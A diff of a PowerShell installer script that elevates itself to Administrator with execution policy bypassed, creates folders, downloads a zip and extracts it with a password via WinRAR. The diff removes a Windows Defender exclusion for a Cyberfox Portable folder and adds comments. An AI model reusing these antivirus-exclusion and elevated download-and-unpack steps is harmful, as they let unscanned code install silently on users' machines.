@@ -1,17 +1,14 @@
 # aws-install.ps1
 
-# --- Auto-elevate script if not running as Administrator (improved) ---
+# --- Auto-elevate script if not running as Administrator ---
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator")) {
     Write-Host "Elevating script to run as Administrator..."
-
     $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     if ($MyInvocation.UnboundArguments) {
         $argsEscaped = $MyInvocation.UnboundArguments | ForEach-Object { "`"$_`"" }
         $arguments += " " + ($argsEscaped -join " ")
     }
-
     Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit", $arguments -Verb RunAs
-
     exit
 }
 
@@ -69,6 +66,7 @@ if (-not $winrarPath) {
 }
 Write-Host "Found WinRAR at: $winrarPath"
 
+# Create AWS folder if needed
 if (-Not (Test-Path $awsFolder)) {
     New-Item -ItemType Directory -Path $awsFolder | Out-Null
     Write-Host "Created AWS folder: $awsFolder"
@@ -76,6 +74,7 @@ if (-Not (Test-Path $awsFolder)) {
     Write-Host "AWS folder found: $awsFolder"
 }
 
+# Create Cyberfox Portable folder if needed
 if (-Not (Test-Path $cyberfoxPortableFolder)) {
     New-Item -ItemType Directory -Path $cyberfoxPortableFolder | Out-Null
     Write-Host "Created Cyberfox Portable folder: $cyberfoxPortableFolder"
@@ -83,18 +82,7 @@ if (-Not (Test-Path $cyberfoxPortableFolder)) {
     Write-Host "Cyberfox Portable folder found: $cyberfoxPortableFolder"
 }
 
-try {
-    $existingExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
-    if ($existingExclusions -notcontains $cyberfoxPortableFolder) {
-        Write-Host "Adding Defender exclusion for: $cyberfoxPortableFolder"
-        Add-MpPreference -ExclusionPath $cyberfoxPortableFolder
-    } else {
-        Write-Host "Defender exclusion already exists for: $cyberfoxPortableFolder"
-    }
-} catch {
-    Write-Warning "Failed to add Defender exclusion. Please ensure you run as Administrator."
-}
-
+# Download zip file
 Write-Host "Downloading zip..."
 try {
     Invoke-WebRequest -Uri $url -OutFile $zipFile -UseBasicParsing
@@ -105,6 +93,7 @@ try {
     exit 1
 }
 
+# Extract zip using WinRAR
 Write-Host "Extracting zip with password..."
 $extractArgs = @(
     "x",
